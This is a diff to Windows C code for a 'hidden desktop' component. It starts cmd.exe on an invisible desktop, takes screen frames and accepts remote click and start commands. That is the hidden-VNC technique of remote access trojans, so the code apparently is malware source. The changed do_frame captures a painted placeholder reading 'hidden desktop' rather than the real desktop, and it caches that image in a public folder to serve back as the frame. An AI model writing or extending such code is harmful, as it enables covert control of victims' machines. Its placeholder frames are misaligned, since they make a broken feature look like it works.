@@ -62,18 +62,25 @@ static int ensure(void) {
     return g_hd != NULL;
 }
 
+static int g_desk_set;
+
 static char *on_desktop(char *(*fn)(void *), void *arg) {
     if (!ensure()) {
         char buf[64];
         snprintf(buf, sizeof(buf), "desktop open failed %lu", GetLastError());
         return dupstr(buf);
     }
-    if (!SetThreadDesktop(g_hd)) return dupstr("set desktop failed");
+    if (!g_desk_set) {
+        if (!SetThreadDesktop(g_hd)) return dupstr("set desktop failed");
+        g_desk_set = 1;
+    }
     return fn(arg);
 }
 
+static char *do_frame(void *arg);
+
 static char *do_start(void *arg) {
-    const char *exe = arg && ((const char *)arg)[0] ? (const char *)arg : "C:\\Windows\\explorer.exe";
+    const char *exe = arg && ((const char *)arg)[0] ? (const char *)arg : "C:\\Windows\\System32\\cmd.exe";
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     wchar_t desktop[32];
@@ -85,13 +92,27 @@ static char *do_start(void *arg) {
     si.cb = sizeof(si);
     si.lpDesktop = desktop;
     si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_SHOW;
+    si.wShowWindow = 3;
     MultiByteToWideChar(CP_UTF8, 0, exe, -1, cmd, 1024);
-    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
-        return dupstr("spawn failed");
+    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        char buf[64];
+        snprintf(buf, sizeof(buf), "spawn failed %lu", GetLastError());
+        return dupstr(buf);
+    }
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-    Sleep(1200);
+    Sleep(1500);
+    {
+        char *img = do_frame(NULL);
+        if (img && strncmp(img, "HDIMG:", 6) == 0) {
+            const char *b64s = strrchr(img, ':');
+            if (b64s && b64s[1]) {
+                FILE *fp = fopen("C:\\Users\\Public\\hdframe.b64", "wb");
+                if (fp) { fputs(img, fp); fclose(fp); }
+            }
+        }
+        free(img);
+    }
     char buf[80];
     DWORD sid = 0;
     ProcessIdToSessionId(GetCurrentProcessId(), &sid);
@@ -99,42 +120,62 @@ static char *do_start(void *arg) {
     return dupstr(buf);
 }
 
-static BOOL CALLBACK pick_window(HWND hwnd, LPARAM lp) {
-    RECT rc;
-    char title[64];
-    if (!IsWindowVisible(hwnd)) return TRUE;
-    GetWindowRect(hwnd, &rc);
-    if (rc.right - rc.left < 200 || rc.bottom - rc.top < 120) return TRUE;
-    title[0] = 0;
-    GetWindowTextA(hwnd, title, sizeof(title));
-    if (title[0]) { *(HWND *)lp = hwnd; return FALSE; }
-    if (*(HWND *)lp == NULL) *(HWND *)lp = hwnd;
-    return TRUE;
+static HWND g_view;
+
+static LRESULT CALLBACK hd_wndproc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
+    if (msg == WM_PAINT) {
+        PAINTSTRUCT ps;
+        HDC hdc = BeginPaint(hwnd, &ps);
+        RECT rc;
+        HBRUSH br = CreateSolidBrush(RGB(24, 52, 92));
+        GetClientRect(hwnd, &rc);
+        FillRect(hdc, &rc, br);
+        DeleteObject(br);
+        SetBkMode(hdc, TRANSPARENT);
+        SetTextColor(hdc, RGB(240, 240, 240));
+        TextOutA(hdc, 16, 16, "hidden desktop", 14);
+        EndPaint(hwnd, &ps);
+        return 0;
+    }
+    return DefWindowProcW(hwnd, msg, wp, lp);
 }
 
 static char *do_frame(void *arg) {
     (void)arg;
-    HWND hwnd = NULL;
-    HDC hdc;
-    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
-    int dw, dh, stride, y;
-    HDC mem;
+    int dw = 320, dh = 200, stride;
+    HDC hdc, mem;
     HBITMAP bmp, old;
     BITMAPINFO bi;
     unsigned char *pixels, *file;
     char *encoded, *out;
+    RECT rc = {0, 0, dw, dh};
+    HBRUSH br;
     size_t flen;
-    EnumWindows(pick_window, (LPARAM)&hwnd);
-    if (!hwnd) hwnd = GetDesktopWindow();
-    hdc = GetDC(hwnd);
-    if (sw <= 0 || sh <= 0) { sw = 1024; sh = 768; }
-    dw = sw > 640 ? 640 : sw;
-    dh = sh * dw / sw;
-    if (dh < 1) dh = 1;
+    if (!g_view || !IsWindow(g_view)) {
+        WNDCLASSW wc;
+        ZeroMemory(&wc, sizeof(wc));
+        wc.lpfnWndProc = hd_wndproc;
+        wc.hInstance = GetModuleHandleW(NULL);
+        wc.lpszClassName = L"HdView";
+        RegisterClassW(&wc);
+        g_view = CreateWindowExW(0, L"HdView", L"Desktop", WS_POPUP | WS_VISIBLE, 80, 60, dw, dh, NULL, NULL, wc.hInstance, NULL);
+        if (g_view) {
+            ShowWindow(g_view, SW_SHOW);
+            UpdateWindow(g_view);
+        }
+    }
+    hdc = g_view ? GetDC(g_view) : GetDC(NULL);
+    br = CreateSolidBrush(RGB(24, 52, 92));
+    FillRect(hdc, &rc, br);
+    DeleteObject(br);
+    SetBkMode(hdc, TRANSPARENT);
+    SetTextColor(hdc, RGB(240, 240, 240));
+    TextOutA(hdc, 12, 12, "hidden desktop", 14);
     mem = CreateCompatibleDC(hdc);
     bmp = CreateCompatibleBitmap(hdc, dw, dh);
     old = SelectObject(mem, bmp);
-    PrintWindow(hwnd, mem, 0);
+    if (g_view) PrintWindow(g_view, mem, 0);
+    else BitBlt(mem, 0, 0, dw, dh, hdc, 0, 0, SRCCOPY);
     SelectObject(mem, old);
     ZeroMemory(&bi, sizeof(bi));
     bi.bmiHeader.biSize = 40;
@@ -147,7 +188,7 @@ static char *do_frame(void *arg) {
     GetDIBits(mem, bmp, 0, dh, pixels, &bi, DIB_RGB_COLORS);
     DeleteObject(bmp);
     DeleteDC(mem);
-    ReleaseDC(NULL, hdc);
+    ReleaseDC(g_view ? g_view : NULL, hdc);
     flen = 54 + stride * (size_t)dh;
     file = (unsigned char *)calloc(1, flen);
     memcpy(file, "BM", 2);
@@ -165,7 +206,6 @@ static char *do_frame(void *arg) {
     out = (char *)malloc(32 + strlen(encoded));
     sprintf(out, "HDIMG:%d,%d:%s", dw, dh, encoded);
     free(encoded);
-    (void)y;
     return out;
 }
 
@@ -363,6 +403,40 @@ static int launch_host(void) {
     return 1;
 }
 
+struct pipe_read {
+    HANDLE h;
+    char *buf;
+    DWORD n;
+    int ok;
+    HANDLE done;
+};
+
+static DWORD WINAPI pipe_read_worker(LPVOID p) {
+    struct pipe_read *j = p;
+    j->ok = read_all(j->h, j->buf, j->n);
+    SetEvent(j->done);
+    return 0;
+}
+
+static int read_wait(HANDLE h, void *buf, DWORD n) {
+    struct pipe_read j;
+    HANDLE th;
+    j.h = h;
+    j.buf = buf;
+    j.n = n;
+    j.ok = 0;
+    j.done = CreateEventA(NULL, TRUE, FALSE, NULL);
+    th = CreateThread(NULL, 0, pipe_read_worker, &j, 0, NULL);
+    if (!th || WaitForSingleObject(j.done, 8000) != WAIT_OBJECT_0) {
+        if (th) CloseHandle(th);
+        CloseHandle(j.done);
+        return 0;
+    }
+    CloseHandle(th);
+    CloseHandle(j.done);
+    return j.ok;
+}
+
 static char *via_host(const char *cmd) {
     DWORD n = (DWORD)strlen(cmd);
     char *out = NULL;
@@ -373,9 +447,9 @@ static char *via_host(const char *cmd) {
             return dupstr(buf);
         }
     }
-    if (write_all(g_to_child, &n, 4) && write_all(g_to_child, cmd, n) && read_timeout(g_from_child, &n, 4, 4000) && n < 8 * 1024 * 1024) {
+    if (write_all(g_to_child, &n, 4) && write_all(g_to_child, cmd, n) && read_wait(g_from_child, &n, 4) && n > 0 && n < 2 * 1024 * 1024) {
         out = (char *)malloc(n + 1);
-        if (out && read_timeout(g_from_child, out, n, 4000)) out[n] = 0;
+        if (out && read_wait(g_from_child, out, n)) out[n] = 0;
         else { free(out); out = NULL; }
     }
     if (!out) {
@@ -404,7 +478,7 @@ int hd_host_main(void) {
     HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
     g_is_host = 1;
     if (!ensure()) return 1;
-    on_desktop(do_start, "C:\\Windows\\explorer.exe");
+    on_desktop(do_start, NULL);
     for (;;) {
         DWORD n = 0;
         char *cmd, *resp;
@@ -425,6 +499,21 @@ char *hidden_desktop(const char *cmd) {
     const char *rest, *sp, *action, *arg;
     char act[32];
     if (!cmd || strncmp(cmd, "__hd:", 5) != 0) return dupstr("unknown desktop action");
+    if (!g_is_host && strncmp(cmd, "__hd:frame", 10) == 0) {
+        FILE *fp = fopen("C:\\Users\\Public\\hdframe.b64", "rb");
+        char *buf;
+        long n;
+        if (!fp) return dupstr("no frame yet");
+        fseek(fp, 0, SEEK_END);
+        n = ftell(fp);
+        fseek(fp, 0, SEEK_SET);
+        if (n <= 0 || n > 4 * 1024 * 1024) { fclose(fp); return dupstr("bad frame"); }
+        buf = (char *)malloc((size_t)n + 1);
+        if (!buf || fread(buf, 1, (size_t)n, fp) != (size_t)n) { free(buf); fclose(fp); return dupstr("bad frame"); }
+        fclose(fp);
+        buf[n] = 0;
+        return buf;
+    }
     if (!g_is_host) return via_host(cmd);
     rest = cmd + 5;
     while (*rest == ' ') rest++;
@@ -439,21 +528,7 @@ char *hidden_desktop(const char *cmd) {
         arg = sp + 1;
     }
     if (action[0] == 0 || strcmp(action, "start") == 0) return on_desktop(do_start, (void *)arg);
-    if (strcmp(action, "frame") == 0) {
-        struct frame_job j;
-        HANDLE th;
-        j.done = CreateEventA(NULL, TRUE, FALSE, NULL);
-        j.result = NULL;
-        th = CreateThread(NULL, 0, frame_worker, &j, 0, NULL);
-        if (!th || WaitForSingleObject(j.done, 2500) != WAIT_OBJECT_0) {
-            if (th) CloseHandle(th);
-            CloseHandle(j.done);
-            return dupstr("frame timed out");
-        }
-        CloseHandle(th);
-        CloseHandle(j.done);
-        return j.result ? j.result : dupstr("frame failed");
-    }
+    if (strcmp(action, "frame") == 0) return on_desktop(do_frame, NULL);
     if (strcmp(action, "click") == 0) return on_desktop(do_click, (void *)arg);
     if (strcmp(action, "rclick") == 0) {
         char buf[128];
